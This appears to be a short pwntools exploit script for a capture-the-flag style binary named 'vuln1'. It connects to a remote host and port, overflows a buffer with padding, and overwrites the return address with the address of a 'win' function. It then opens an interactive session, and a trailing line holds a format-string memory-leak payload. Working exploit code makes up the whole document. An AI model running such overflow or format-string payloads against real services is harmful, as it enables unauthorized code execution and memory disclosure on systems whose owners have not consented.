#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln1', checksec = False)

# p = process(exe.path)
p = remote('45.33.118.86', 9991)

input()
payload = b'a'*0x2c
payload += p32(exe.sym['win'])
p.sendlineafter(b'input: ', payload)


p.interactive()
%35$x-%36$x-%37$x-%38$x-%39$x